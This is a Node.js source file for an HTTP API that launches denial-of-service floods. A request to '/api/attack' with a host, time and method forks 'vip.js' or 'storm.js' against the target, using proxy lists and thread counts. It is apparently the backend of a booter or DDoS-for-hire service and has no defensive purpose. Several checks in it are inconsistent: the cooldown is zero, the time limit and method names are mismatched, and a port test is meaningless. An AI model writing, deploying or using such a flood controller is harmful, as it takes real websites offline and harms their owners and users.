const http = require('http');

const { fork } = require('child_process');

const url = require('url');
const { mkdirSync } = require('fs');

const port = 9999;

let lastAPICallTime = Date.now();



const runScript = (scriptName, args) => {

  const childProcess = fork(scriptName, args);



  childProcess.on('error', (err) => {

    console.error(err);

  });



  childProcess.on('message', (message) => {

    console.log(message);

  });

};



const server = http.createServer((req, res) => {

  const currentTime = Date.now();

  const cooldown = 30 * 0;

  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const parsedUrl = url.parse(req.url, true);

  const { key, host, time, method } = parsedUrl.query;

  



  if (!host || !port || !time || !method) {

    const err_u = {

      error: true,

      message: 'Syntax error > Usage : /api/attack?host=[url]&port=[port]&method=[methods]&time=[time]',

      code: 410

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_u));

    return;

  }



  if (!port) {

    const err_p = {

      message: 'Missing port',

      code: 404

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_p));

    return;

  }



  if (time > 200) {

    const err_time = {

      message: 'Time must be less than 60 seconds',

      code: 400

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_time));

    return;

  }



  if (!host) {

    const err_host = {

      message: 'Missing host',

      code: 404

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_host));

    return;

  }



  if (

    !(

      method.toLowerCase() === 'vip' ||

      method.toLowerCase() === 'storm'

    )

  ) {

    const err_method = {

      err: true,

      method_valid: 'Enter correct Method: flooder | storm',

      code: 403

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_method));

    return;

  }



  

  const jsonData = {

    status: 'Send attack successfully all server',

    running: '1/10',

    host: host,

    time: time,

    method: method,

    tts: 427.121,

    code: 200

  };



  res.writeHead(200, { 'Content-Type': 'application/json' });

  res.end(JSON.stringify(jsonData));



  lastAPICallTime = currentTime;



  if (method.toLowerCase() === 'vip') {

    runScript('vip.js', [host, time, '64', '7', '1080.txt']);

  } else if (method.toLowerCase() === 'storm') {

    runScript('storm.js', [host, time, '32', '2', 'http.txt']);

  }

});



server.listen(port, () => {

  

}); 